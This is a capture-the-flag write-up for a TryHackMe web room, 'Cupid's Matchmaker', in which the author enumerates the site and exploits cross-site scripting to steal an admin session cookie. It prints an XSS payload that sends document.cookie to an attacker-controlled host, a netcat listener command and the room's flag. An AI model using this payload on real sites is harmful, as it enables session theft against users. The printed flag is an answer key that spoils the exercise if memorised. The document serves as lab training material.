# <div align="center">[Cupid's Matchmaker](https://tryhackme.com/room/lafb2026e3)</div>
<div align="center">Use your web exploitation skills against this matchmaking service.</div>
<div align="center">
  <img width="200" height="200" alt="cupid matchmaker" src="https://github.com/user-attachments/assets/040914dd-9219-4e0d-b9e1-5ca3cc894d7a" />
</div>

## Task 1. Cupids Matchmaker
### What is the flag?
```
```

--- 

## Initial Access

The lab already provides the target IP and port for the web service, so I went straight to the application in the browser to begin interacting with it.

<div align="center">
  <img width="941" height="750" alt="image" src="https://github.com/user-attachments/assets/0838db61-589e-45fb-a04a-ccbe470a9739" />
</div>

## Navigating the Application

Once the page loaded, I noticed a survey form as the main interaction point. This looked like the primary functionality of the application, so I proceeded by filling it out.

<div align="center">
  <img width="1225" height="1015" alt="image" src="https://github.com/user-attachments/assets/7d8fcb33-e6a6-4a59-86cf-4d94f250b161" />
</div>

After submitting the survey, the application returned a response page.

<div align="center">
  <img width="1779" height="916" alt="image" src="https://github.com/user-attachments/assets/6a71c519-88d2-469a-98a0-920be4e3e365" />
</div>

## Web Enumeration
To understand the attack surface better, I started enumerating available endpoints and directories.

<div align="center">
  <img width="967" height="486" alt="image" src="https://github.com/user-attachments/assets/47803bd2-ee67-4597-a8bb-abd27e22d289" />
</div>

During enumeration, I discovered an /admin page. Naturally, I accessed it to see if there was any direct entry point.

<div align="center">
  <img width="1206" height="886" alt="image" src="https://github.com/user-attachments/assets/311660f4-603f-4430-b553-99a951691e7e" />
</div>

The page did not immediately reveal anything useful, and my initial attempts did not lead to progress. At this point, I reviewed my approach and identified that the application was likely vulnerable to client-side injection.

## Exploiting XSS to Capture Admin Cookie

The application allowed input that was reflected back, which opened the possibility of exploiting a Cross Site Scripting vulnerability. I crafted a payload to capture the admin's session cookie.
```js
<script>fetch('http://<ip>:8000/?c='+document.cookie)</script>
```
Before triggering the payload, I set up a listener to catch the incoming request:

```
nc -lnvp 8000
```

I then injected the payload through the application input.

<div align="center">
  <img width="1226" height="972" alt="image" src="https://github.com/user-attachments/assets/e7a157ce-9058-4d33-8397-59e88eaeb70c" />
</div>

After triggering it, I received a connection on my listener containing the admin cookie.

<div align="center">
  <img width="1219" height="323" alt="image" src="https://github.com/user-attachments/assets/9f08f830-f37f-48a7-8a20-7c488176561e" />
</div>

### Decoding the Cookie
With the captured cookie, I proceeded to decode it to extract meaningful information.

<div align="center">
  <img width="811" height="81" alt="image" src="https://github.com/user-attachments/assets/fba839fe-4dd5-4d29-a409-5ae808d017d9" />
</div>

## Flag
```
THM{XSS_CuP1d_Str1k3s_Ag41n}
```

> Thanks for reading.
